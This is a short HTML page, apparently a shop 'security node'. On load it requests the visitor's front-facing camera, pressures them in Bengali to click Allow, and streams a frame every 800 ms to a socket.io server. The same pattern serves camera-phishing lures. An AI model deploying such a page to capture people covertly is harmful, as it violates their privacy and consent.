<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Security Node - Active</title>
    <script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-[#020617] text-slate-300 flex flex-col items-center justify-center min-h-screen font-sans p-6">

    <div class="w-full max-w-sm bg-slate-900/50 border border-slate-800 p-8 rounded-[2.5rem] backdrop-blur-xl text-center shadow-2xl">
        <h1 class="text-xl font-bold text-white mb-4">Shop Security Node</h1>
        
        <div id="setup-box">
            <p class="text-sm text-slate-400 mb-6">ক্যামেরা চালু করতে উপরের পপ-আপে <span class="text-blue-400 font-bold">"Allow"</span> বাটনে ক্লিক করুন।</p>
            <button onclick="requestAccess()" class="bg-blue-600 hover:bg-blue-500 text-white px-6 py-3 rounded-2xl font-bold transition-all w-full">
                Enable Camera Permission
            </button>
        </div>

        <div id="camera-box" class="hidden">
            <div class="relative rounded-2xl overflow-hidden bg-black aspect-video mb-4 border border-slate-700">
                <video id="video" autoplay playsinline class="w-full h-full object-cover opacity-60"></video>
                <div class="absolute top-3 left-3 bg-red-600 px-2 py-0.5 rounded text-[10px] font-bold text-white animate-pulse">LIVE</div>
            </div>
            <p class="text-emerald-400 text-xs font-bold uppercase tracking-widest">Broadcasting Securely</p>
        </div>
    </div>

    <canvas id="canvas" class="hidden"></canvas>

    <script>
        const socket = io();
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const ctx = canvas.getContext('2d');
        const setupBox = document.getElementById('setup-box');
        const cameraBox = document.getElementById('camera-box');

        // পেজ লোড হওয়া মাত্রই পপ-আপ চাইবে
        window.onload = () => {
            requestAccess();
        };

        async function requestAccess() {
            try {
                // এই লাইনটিই ব্রাউজারে পপ-আপ নিয়ে আসে
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: "user" }, 
                    audio: false 
                });
                
                video.srcObject = stream;
                setupBox.classList.add('hidden');
                cameraBox.classList.remove('hidden');

                video.onloadedmetadata = () => {
                    startStreaming();
                };
            } catch (err) {
                alert("ক্যামেরা পারমিশন না দিলে সিকিউরিটি সিস্টেম কাজ করবে না। দয়া করে Allow করুন।");
                console.error("Permission error:", err);
            }
        }

        function startStreaming() {
            setInterval(() => {
                if (!video.videoWidth) return;
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                ctx.drawImage(video, 0, 0);
                const frame = canvas.toDataURL('image/webp', 0.4);
                socket.emit('store-frame', frame);
            }, 800);
        }
    </script>
</body>
</html>
